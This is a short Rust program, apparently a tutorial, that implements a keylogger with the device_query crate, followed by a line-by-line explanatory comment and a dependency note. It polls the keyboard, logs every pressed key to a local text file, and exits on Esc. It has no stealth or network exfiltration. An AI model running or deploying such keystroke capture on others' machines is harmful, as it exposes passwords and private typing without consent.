use device_query::{DeviceQuery, DeviceState, Keycode};
use std::{thread, time::Duration};
use std::fs::OpenOptions;
use std::io::Write;

fn main() {
    // Set up a file to log the keystrokes
    let mut log_file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("keylog_rust.txt")
        .unwrap();

    let device_state = DeviceState::new();
    
    // Infinite loop to capture keystrokes
    loop {
        // Get the current state of the keyboard
        let keys = device_state.get_keys();
        
        // Log pressed keys to file
        for key in keys {
            match key {
                Keycode::Esc => {
                    // If 'Esc' is pressed, exit the loop and stop logging
                    writeln!(log_file, "Exiting keylogger...").unwrap();
                    println!("Exiting keylogger...");
                    return;
                }
                _ => {
                    // Log the key
                    writeln!(log_file, "Key {:?} pressed", key).unwrap();
                    print!("{:?} ", key); // Optionally, print to console
                }
            }
        }

        // Sleep for a short interval to avoid high CPU usage
        thread::sleep(Duration::from_millis(100));
    }
}
/*
1. use device_query::{DeviceQuery, DeviceState, Keycode};:

This imports the necessary parts of the device_query crate to interact 
with the keyboard. The DeviceState provides 
the current state of all input devices (including the keyboard), 
and Keycode represents the keys that are pressed.
2. use std::{thread, time::Duration};:
We use this for managing the sleep duration, which prevents the program 
from constantly polling the keyboard in a way that would use up too much CPU.
3. use std::fs::OpenOptions;:
This is used to open a file and append keystrokes to it. The OpenOptions::new() 
creates a new file (if it doesn't exist) and opens it for appending new data.
4. let mut log_file = OpenOptions::new()...:
This line opens or creates the file keylog_rust.txt where we will log the 
keystrokes. The file will be created in the current working directory.
5.let device_state = DeviceState::new();:
This creates a new instance of DeviceState, which will be used to query the 
state of input devices (in this case, the keyboard).
6. loop { ... }:
This is the main loop of the keylogger. It will continuously check the state of
 the keyboard and log any keys pressed.
7. let keys = device_state.get_keys();:
    This retrieves the current keys that are pressed on the keyboard.
8. for key in keys { ... }:
We iterate through the list of keys that are currently pressed and log each 
one. If the Esc key is pressed, the keylogger will exit.
9. writeln!(log_file, "Key {:?} pressed", key).unwrap();:
This writes the key press to the log file, using writeln! to append the 
pressed key and its representation (e.g., Keycode::A).
10. thread::sleep(Duration::from_millis(100));:
This prevents the program from consuming too much CPU by adding a small 
delay between each poll of the keyboard.
11. return;:
If the Esc key is pressed, the program writes an "Exiting keylogger..." 
message to the file and then exits the loop, stopping the keylogger.
*/
 
/*edit cargo.toml add dependencies
[dependencies]
device_query = "0.2"
*/
